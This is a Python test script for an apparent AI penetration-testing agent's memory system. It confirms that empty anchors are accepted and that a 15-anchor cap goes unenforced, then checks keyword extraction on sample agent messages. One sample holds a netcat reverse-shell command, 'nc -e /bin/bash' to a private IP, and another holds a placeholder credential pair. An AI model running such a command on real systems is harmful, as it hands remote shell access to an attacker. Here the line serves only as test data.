#!/usr/bin/env python3
"""
VERIFY BUGS IN ANCHOR SYSTEM
============================
1. Empty text bug
2. Anchor limit not enforced bug

Then implement fixes and test.
"""

from phantom.agents.state import AgentState
from phantom.llm.memory_compressor import _extract_anchors_from_chunk

print('=' * 70)
print('BUG VERIFICATION - DUAL ANCHOR SYSTEM')
print('=' * 70)

# ============================================================================
# BUG 1: Empty text accepted in add_finding_anchor()
# ============================================================================
print('\n[BUG 1] Empty text accepted')
print('-' * 50)

state1 = AgentState(agent_id="test1", agent_name="Test1", task="test")

# Try to add empty text anchor
state1.add_finding_anchor({"key": "empty", "text": "", "source": "compressor"})

print(f'Added empty text anchor')
print(f'Anchors count: {len(state1.finding_anchors)}')
print(f'BUG CONFIRMED: Empty text was accepted!')

# Try whitespace only
state1.add_finding_anchor({"key": "whitespace", "text": "   ", "source": "compressor"})
print(f'Added whitespace text anchor')
print(f'Anchors count: {len(state1.finding_anchors)}')
print(f'BUG CONFIRMED: Whitespace text was accepted!')

# ============================================================================
# BUG 2: Anchor limit (15) NOT enforced
# ============================================================================
print('\n[BUG 2] Anchor limit not enforced')
print('-' * 50)

state2 = AgentState(agent_id="test2", agent_name="Test2", task="test")

# Add 25 anchors (should be limited to 15)
for i in range(25):
    state2.add_finding_anchor({
        "key": f"anchor-{i}", 
        "text": f"Test finding number {i} with some content", 
        "source": "compressor"
    })

print(f'Added 25 anchors')
print(f'Anchors count: {len(state2.finding_anchors)}')
print(f'Expected: 15 (as per code at llm.py:636)')
print(f'BUG CONFIRMED: {len(state2.finding_anchors)} anchors stored (not capped)!')

# ============================================================================
# PROOF: What happens in injection (llm.py:636)
# ============================================================================
print('\n[PROOF] What gets injected')
print('-' * 50)

# Only takes first 15 from state
injected_anchors = state2.finding_anchors[:15]
print(f'State has {len(state2.finding_anchors)} anchors')
print(f'But injection only uses first 15: {len(injected_anchors)}')
print(f'Wasted: {len(state2.finding_anchors) - 15} anchors taking memory')

# ============================================================================
# TEST: Other keywords work correctly
# ============================================================================
print('\n[TEST] Keyword detection works correctly')
print('-' * 50)

test_messages = [
    {'role': 'assistant', 'content': 'Found SQL injection in /api/login. Confirmed with UNION SELECT.'},
    {'role': 'assistant', 'content': 'Found XSS in /api/search. Payload reflected without encoding.'},
    {'role': 'assistant', 'content': 'Got reverse shell! nc -e /bin/bash 10.10.10.10 4444'},
    {'role': 'assistant', 'content': 'Extracted credentials: admin:password123 from database'},
]

anchors = _extract_anchors_from_chunk(test_messages)
print(f'Messages: {len(test_messages)}')
print(f'Anchors extracted: {len(anchors)}')
print(f'All critical findings captured: {len(anchors) == 4}')

print('\n' + '=' * 70)
print('VERIFICATION COMPLETE - BUGS CONFIRMED')
print('=' * 70)